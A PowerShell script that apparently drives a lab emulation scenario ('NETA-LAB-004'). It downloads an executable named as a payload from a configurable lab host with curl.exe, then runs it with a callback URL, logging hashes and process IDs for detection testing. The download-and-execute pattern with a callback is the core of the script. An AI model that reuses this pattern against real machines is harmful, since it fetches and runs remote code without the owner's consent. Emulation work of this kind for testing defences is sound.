param(
    [Parameter(Mandatory = $true)]
    [string]$LabHost,
    [int]$Port = 18443,
    [Parameter(Mandatory = $true)]
    [string]$ServerCertificatePath,
    [switch]$KeepDownloadedArtifact
)

$ErrorActionPreference = "Stop"
$scenario = "NETA-LAB-004"
$runId = "{0}-{1}" -f (Get-Date).ToUniversalTime().ToString("yyyyMMddTHHmmssZ"), $PID
$ServerCertificatePath = [System.IO.Path]::GetFullPath($ServerCertificatePath)
$tempRoot = Join-Path ([System.IO.Path]::GetTempPath()) ("neta-lab-004-{0}" -f $runId)
$payloadPath = Join-Path $tempRoot "neta-lab-004-payload.exe"
$downloadUrl = "https://$LabHost`:$Port/payload/neta-lab-004-payload.exe"
$callbackUrl = "https://$LabHost`:$Port/callback?run_id=$runId"

function Get-PemCertificateSha256 {
    param([Parameter(Mandatory = $true)][string]$Path)

    $pem = Get-Content -LiteralPath $Path -Raw
    $match = [regex]::Match(
        $pem,
        "-----BEGIN CERTIFICATE-----(?<body>.*?)-----END CERTIFICATE-----",
        [System.Text.RegularExpressions.RegexOptions]::Singleline
    )
    if (-not $match.Success) {
        throw "No PEM certificate found in $Path"
    }

    $base64 = [regex]::Replace($match.Groups["body"].Value, "\s", "")
    $der = [Convert]::FromBase64String($base64)
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    try {
        $digest = $sha256.ComputeHash($der)
    }
    finally {
        $sha256.Dispose()
    }

    return (($digest | ForEach-Object { $_.ToString("x2") }) -join "")
}

if (-not (Test-Path -LiteralPath $ServerCertificatePath)) {
    throw "Server certificate not found: $ServerCertificatePath"
}

$serverCertSha256 = Get-PemCertificateSha256 -Path $ServerCertificatePath
New-Item -ItemType Directory -Force -Path $tempRoot | Out-Null

Write-Host "$scenario run_id=$runId"
Write-Host "powershell_pid=$PID"
Write-Host "download_url=$downloadUrl"
Write-Host "download_path=$payloadPath"
Write-Host "server_cert_sha256=$serverCertSha256"

try {
    & curl.exe `
        --silent `
        --show-error `
        --fail `
        --cacert $ServerCertificatePath `
        --header "X-NETA-Lab-Scenario: $scenario" `
        --header "X-NETA-Lab-Run: $runId" `
        --user-agent "NETA-Lab/004-Downloader" `
        --output $payloadPath `
        $downloadUrl

    if ($LASTEXITCODE -ne 0) {
        throw "curl.exe failed with exit code $LASTEXITCODE"
    }

    if (-not (Test-Path -LiteralPath $payloadPath)) {
        throw "Downloaded payload was not created: $payloadPath"
    }

    $artifactHash = (Get-FileHash -LiteralPath $payloadPath -Algorithm SHA256).Hash.ToLowerInvariant()
    $artifactSize = (Get-Item -LiteralPath $payloadPath).Length
    Write-Host "download_complete sha256=$artifactHash bytes=$artifactSize"

    $child = Start-Process `
        -FilePath $payloadPath `
        -ArgumentList @(
            "--url", $callbackUrl,
            "--server-cert-sha256", $serverCertSha256,
            "--run-id", $runId
        ) `
        -PassThru

    Write-Host "payload_pid=$($child.Id)"
    $child.WaitForExit()
    Write-Host "payload_exit_code=$($child.ExitCode)"

    if ($child.ExitCode -ne 0) {
        throw "Benign payload failed with exit code $($child.ExitCode)"
    }

    Write-Host "$scenario complete run_id=$runId artifact_sha256=$artifactHash"
}
finally {
    if ($KeepDownloadedArtifact) {
        Write-Host "Keeping scenario artifacts at $tempRoot"
    }
    else {
        Remove-Item -LiteralPath $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
    }
}
